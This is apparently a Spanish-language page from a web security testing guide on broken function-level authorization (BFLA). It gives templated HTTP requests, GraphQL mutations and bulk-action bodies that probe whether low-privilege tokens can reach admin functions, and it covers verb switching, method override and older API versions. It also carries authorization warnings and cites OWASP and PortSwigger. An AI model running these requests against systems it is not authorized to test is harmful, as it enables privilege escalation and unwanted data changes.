# 🗡️ BFLA: autorización rota por función: payloads y técnicas

> **Uso autorizado:** sustituir `{ORIGEN}`, `{TOKEN_A}`, `{ID_PROPIO}` y `{ID_CONTROLADO_B}` por valores del entorno y de cuentas propias. No ejecutar muestras que cambien estado sin permiso específico y plan de reversión.

## 🎯 Preparación

- Capturar primero la solicitud legítima y su respuesta esperada.
- Mantener igual método, sesión, cabeceras y cuerpo salvo el campo bajo prueba.
- Usar un marcador único como `prueba-123` para distinguir reflejos y efectos de caché.

## 📚 Banco ampliado de payloads

[Abrir el catálogo por técnica y los diccionarios de PayloadsAllTheThings](Catalogo_PATT.md). Los bloques de esta guía explican las pruebas iniciales; el catálogo reúne variantes adicionales por motor, parser y contexto.

> **Lectura del banco:** cuando un bloque enumera varias URL, rutas, cabeceras o cuerpos, cada línea suele ser una alternativa. Elegir la variante que corresponde al motor, parser y flujo real.

## 💉 Payloads básicos

### Funciones privilegiadas de lectura

```text
GET /api/admin/test-report
GET /api/v1/admin/test-report
GET /api/test-report/export?limit=1
```

**Cuándo usarlo:** Comparar rol bajo/alto con datos de prueba. 200 vacío o login HTML no demuestra acceso.

**Fuente:** [OWASP API Security](https://api-security.owasp.org/editions/2023/en/0xa5-broken-function-level-authorization/).


### Métodos y acciones sobre un objeto propio

```text
GET /api/test-items/{ID_PROPIO}
POST /api/test-items/{ID_PROPIO}/archive
PATCH /api/test-items/{ID_PROPIO}
DELETE /api/test-items/{ID_PROPIO}
```

**Cuándo usarlo:** Usar únicamente métodos y acciones que el endpoint documente. DELETE solo en sandbox; comparar autorización por función y efecto persistido.

**Fuente:** [OWASP API Security](https://api-security.owasp.org/editions/2023/en/0xa5-broken-function-level-authorization/).


## 🧭 Payloads por contexto

### Versión y override de método

```http
PATCH /api/v1/test-items/{ID_PROPIO} HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_ROL_BAJO}
Content-Type: application/json

{"label":"canary-{NONCE}"}

### PETICIÓN ALTERNATIVA
POST /api/v1/test-items/{ID_PROPIO} HTTP/1.1
Host: {ORIGEN}
X-HTTP-Method-Override: PATCH
Authorization: Bearer {TOKEN_ROL_BAJO}
Content-Type: application/json

{"label":"canary-{NONCE}"}
```

**Cuándo usarlo:** Dos solicitudes alternativas separadas por el marcador ###, que no forma parte de HTTP: PATCH directo como control y POST con override solo si la plataforma lo admite. Confirmar rol y efecto persistido.

**Fuente:** [OWASP WSTG](https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management/06-HTTP_Methods/).


## 🔥 Payloads avanzados

### Mutaciones y bulk

```text
mutation { createTestInvite(role:"viewer",email:"{EMAIL_PROPIO}") { id } }
POST /api/admin/test-items/bulk  {"ids":["{ID_PROPIO}"],"action":"archive"}
```

**Cuándo usarlo:** Son dos operaciones alternativas, sujetas al esquema y las rutas reales. Usar función reversible y comparar política de resolver o bulk con la acción individual.

**Fuente:** [OWASP API Security](https://api-security.owasp.org/editions/2023/en/0xa5-broken-function-level-authorization/).


## 🔬 Pruebas guiadas por escenario

### 1. Función admin de lectura

**Objetivo:** Rol bajo compara acceso a una función solo para administrador.

```http
GET /api/admin/test-report HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_ROL_BAJO}
```

**Interpretación:** Confirmar datos privilegiados; un 200 vacío o página de login no prueba BFLA.

**Fuente técnica:** [OWASP API Security](https://api-security.owasp.org/editions/2023/en/0xa5-broken-function-level-authorization/).

### 2. Función admin POST inocua

**Objetivo:** Comprobar si un rol bajo puede ejecutar una acción reversible propia.

```http
POST /api/admin/test-items HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_ROL_BAJO}
Content-Type: application/json

{"name":"canary-{NONCE}"}
```

**Interpretación:** Verificar objeto creado y limpiar. La ruta es plantilla; usar función real en alcance.

**Fuente técnica:** [OWASP API Security](https://api-security.owasp.org/editions/2023/en/0xa5-broken-function-level-authorization/).

### 3. Cambio de verbo

**Objetivo:** Comparar política de GET, PATCH y DELETE sobre objeto de prueba.

```text
GET /api/v1/test-items/{ID_PROPIO}
PATCH /api/v1/test-items/{ID_PROPIO}
DELETE /api/v1/test-items/{ID_PROPIO}
```

**Interpretación:** No ejecutar DELETE fuera de laboratorio; una lista de métodos no demuestra permiso.

**Fuente técnica:** [OWASP API Security](https://api-security.owasp.org/editions/2023/en/0xa5-broken-function-level-authorization/).

### 4. Ruta de API antigua

**Objetivo:** Buscar middleware ausente en versión previa activa.

```http
GET /api/v1/admin/test-report HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_ROL_BAJO}
```

**Interpretación:** Comparar con v2 equivalente; versión v1 debe estar en alcance y devolver datos reales.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/api-testing).

### 5. Mutación GraphQL administrativa

**Objetivo:** Probar que el resolver exige rol alto.

```graphql
mutation { createTestInvite(role:"viewer", email:"{EMAIL_PROPIO}") { id } }
```

**Interpretación:** Usar únicamente email propio y confirmar que la función era exclusiva de admin.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/graphql).

### 6. Ruta sin sesión

**Objetivo:** Distinguir autenticación de autorización por rol.

```http
GET /api/admin/test-report HTTP/1.1
Host: {ORIGEN}
```

**Interpretación:** Anónimo, rol bajo y rol alto deben producir respuestas distintas según política.

**Fuente técnica:** [OWASP API Security](https://api-security.owasp.org/editions/2023/en/0xa5-broken-function-level-authorization/).

### 7. Método override

**Objetivo:** Comprobar si una pasarela y backend aplican políticas a métodos distintos.

```http
POST /api/v1/test-items/{ID_PROPIO} HTTP/1.1
Host: {ORIGEN}
X-HTTP-Method-Override: PATCH
Authorization: Bearer {TOKEN_ROL_BAJO}
Content-Type: application/json

{"name":"canary-{NONCE}"}
```

**Interpretación:** Solo si la plataforma soporta override; confirmar efecto y rol efectivo.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/api-testing).

### 8. Campo GraphQL administrativo

**Objetivo:** Comprobar política de un resolver de lectura reservado a administradores.

```graphql
query { auditLogs(first:1) { nodes { id } } }
```

**Interpretación:** Adaptar al esquema real y consultar solo un registro de prueba; un campo expuesto no basta sin datos reservados.

**Fuente técnica:** [OWASP API Security](https://api-security.owasp.org/editions/2023/en/0xa5-broken-function-level-authorization/).

### 9. Acción masiva de una sola fila

**Objetivo:** Comprobar que la política de bulk coincide con la función individual.

```json
{"ids":["{ID_PROPIO}"],"action":"archive"}
```

**Interpretación:** Ejecutar solo sobre objeto propio reversible y comparar con autorización del endpoint individual.

**Fuente técnica:** [OWASP API Security](https://api-security.owasp.org/editions/2023/en/0xa5-broken-function-level-authorization/).

## ✅ Evidencia mínima

1. Solicitud de control y solicitud modificada, con diferencias visibles.
2. Respuesta o efecto observado en una cuenta/objeto de prueba independiente.
3. Explicación del control que falló y del alcance real comprobado.

---

[📖 Descripción y análisis](../Descripcion/README.md) · [← Índice general](../../README.md)
